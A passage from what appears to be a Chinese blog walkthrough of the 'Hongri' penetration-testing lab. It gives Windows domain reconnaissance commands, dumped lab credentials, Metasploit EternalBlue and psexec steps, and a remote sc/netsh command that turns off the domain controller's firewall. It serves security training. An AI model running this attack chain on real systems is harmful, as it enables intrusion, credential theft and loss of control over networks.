<li><p>run       <img src="https://api2.mubu.com/v3/document_image/2bd3d5c9-0dcd-4812-9c3d-fb708b68ff82-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>上线之后进行内网信息收集</p>
<ul>
<li><p>ipconfig /all   # 查看本机ip，所在域</p>
</li>
<li><p>route print     # 打印路由信息</p>
</li>
<li><p>net view        # 查看局域网内其他主机名</p>
</li>
<li><p>arp -a          # 查看arp缓存</p>
</li>
<li><p>net start       # 查看开启了哪些服务</p>
</li>
<li><p>net share       # 查看开启了哪些共享</p>
</li>
<li><p>net share ipc$  # 开启ipc共享</p>
</li>
<li><p>net share c$    # 开启c盘共享</p>
</li>
<li><p>net use \192.168.xx.xx\ipc$ “” /user:””    # 与192.168.xx.xx建立空连接</p>
</li>
<li><p>net use \192.168.xx.xx\c$ “密码” /user:”用户名”    # 建立c盘共享</p>
</li>
<li><p>dir \192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件</p>
</li>
<li><p>net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</p>
</li>
<li><p>net user                 # 查看本机用户列表</p>
</li>
<li><p>net user /domain         # 查看域用户</p>
</li>
<li><p>net localgroup administrators    # 查看本地管理员组（通常会有域用户）</p>
</li>
<li><p>net view /domain         # 查看有几个域</p>
</li>
<li><p>net user 用户名 /domain   # 获取指定域用户的信息</p>
</li>
<li><p>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</p>
</li>
<li><p>net group 组名 /domain    # 查看域中某工作组</p>
</li>
<li><p>net time /domain           // 主域服务器会同时作为时间服务器</p>
</li>
<li><p>net group “domain admins” /domain  # 查看域管理员的名字</p>
</li>
<li><p>net group “domain computers” /domain  # 查看域中的其他主机名</p>
</li>
<li><p>net group “doamin controllers” /domain  # 查看域控制器（可能有多台）</p>
</li>
<li><p>net group “Enterprise Admins” /domain    // 查看域管理员组</p>
</li>
</ul>
</li>
<li><p>.<img src="https://api2.mubu.com/v3/document_image/7065b21d-d96d-4b5f-a4cc-f42aac5af9b5-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/444e20c9-a60f-43f8-a281-19b166eb8e87-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>综合上面收集的信息，我们可知，目标网络环境存在一个名为<a target="_blank" rel="noopener" href="http://whoamianony.org/">whoamianony.org</a>的域环境，域控制器主机名为<a target="_blank" rel="noopener" href="http://dc.whoamianony.org/">DC.whoamianony.org</a>，IP为192.168.93.30，域管理员为Administrator。</p>
</li>
<li><p>然后迁移到64进程上进行抓密码<img src="https://api2.mubu.com/v3/document_image/4866beb9-916f-45fe-a1d0-d73d929a67a4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/8b19a4d7-b2d4-40e7-aa4a-b6ded4fc5bf5-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>成功抓到域用户和域管理员的密码</p>
<ul>
<li><p>bunny：Bunny2021</p>
</li>
<li><p>administrator：Whoami2021</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><h3 id="第三层内网渗透"><a href="#第三层内网渗透" class="headerlink" title="第三层内网渗透"></a>第三层内网渗透</h3><ul>
<li><p>添加93网段的路由<img src="https://api2.mubu.com/v3/document_image/ccf7a2ba-f316-4f2a-909a-e8ff00aecc7c-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后探测93网段存活机器</p>
<ul>
<li><p>use auxiliary/scanner/smb/smb_version</p>
</li>
<li><p>set rhosts 192.168.93.1-255</p>
</li>
<li><p>set threads 5</p>
</li>
<li><p>run<img src="https://api2.mubu.com/v3/document_image/178ef4b6-eefb-4e39-962c-ae3d1713dbf4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/ed565e15-527f-4b07-9f7f-c4ba004793a1-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
</ul>
</li>
<li><p>发现两台存活的windows 分别为DC（192.168.93.30）和PC2（192.168.93.40）</p>
</li>
<li><p>先扫端口 通过扫端口发现都开了445  那就测一测永恒之蓝</p>
<ul>
<li><p>use exploit/windows/smb/ms17_010_eternalblue</p>
</li>
<li><p>set rhosts 192.168.93.40</p>
</li>
<li><p>set payload windows/x64/meterpreter/bind_tcp</p>
</li>
<li><p>set lport 8888</p>
</li>
<li><p>exploit<img src="https://api2.mubu.com/v3/document_image/1302f1e9-8d10-4002-97c1-63e52038d632-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
</ul>
</li>
<li><p>直接弹回会话了<img src="https://api2.mubu.com/v3/document_image/5d0aab65-d974-494e-aad5-18d629ab6ae4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>第四台拿下 现在只剩下域控了  既然前面抓到了域管的密码 直接用psexec登录得了</p>
<ul>
<li><p>use exploit/windows/smb/psexec</p>
</li>
<li><p>set rhosts 192.168.93.30</p>
</li>
<li><p>set SMBUser administrator</p>
</li>
<li><p>set SMBPass Whoami2021</p>
</li>
<li><p>set payload windows/meterpreter/bind_tcp</p>
</li>
<li><p>set rhost 192.168.93.30</p>
</li>
<li><p>run</p>
</li>
</ul>
</li>
<li><p>失败了，应该是开了防火墙的原因。</p>
</li>
<li><p>没关系，我们已经有了域控的密码了，就可以控制第二层网络的Windows 7远程关闭域控的防火墙了。首先控制第二层网络的Windows 7与域控建立ipc连接：</p>
<ul>
<li>net use \192.168.93.30\ipc$ “Whoami2021” /user:”Administrator”<img src="https://api2.mubu.com/v3/document_image/531f5605-1539-4ae8-9446-ac1d57c1b455-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></li>
</ul>
</li>
<li><p>连上了  然后来关防火墙</p>
<ul>
<li><p>sc \192.168.93.30 create unablefirewall binpath= “netsh advfirewall set allprofiles state off”</p>
</li>
<li><p>sc \192.168.93.30 start unablefirewall<img src="https://api2.mubu.com/v3/document_image/9b1cbc31-dac0-4304-b101-5ee0b6cef233-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
</ul>
</li>
<li><p>然后在次尝试psexec<img src="https://api2.mubu.com/v3/document_image/80f8f656-3d33-46fb-953d-1a4116bd15d4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/a8247a24-0583-4413-99cc-889ba16bd1ff-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>拿下域控 到此拿下了所有机器  </p>
</li>
<li><p>权限维持就不做了</p>
</li>
<li><p>后记 最后想了一下其他思路 因为第二层的网络是出网的所以可以直接上线cs 在cs上操作 也是可以的</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/">红日靶场</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91/">内网</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/01/22/%E8%BF%B7%E7%B3%8A%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8ssrf%E5%88%B0%E6%9C%80%E7%BB%88%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">迷糊的提权方式以及利用ssrf到最终提权靶机</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/10/30/%E7%BA%A2%E6%97%A54/">
                        <span class="hidden-mobile">红日4</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud 统计PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            总访问量 
            <span id="leancloud-site-pv"></span>
             次
          </span>
      
      
        <!-- LeanCloud 统计UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            总访客数 
            <span id="leancloud-site-uv"></span>
             人
          </span>
      

    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>




  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      $('#local-search-input').on('click', function() {
        searchFunc(path, 'local-search-input', 'local-search-result');
      });
      $('#modalSearch').on('shown.bs.modal', function() {
        $('#local-search-input').focus();
      });
    })()
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
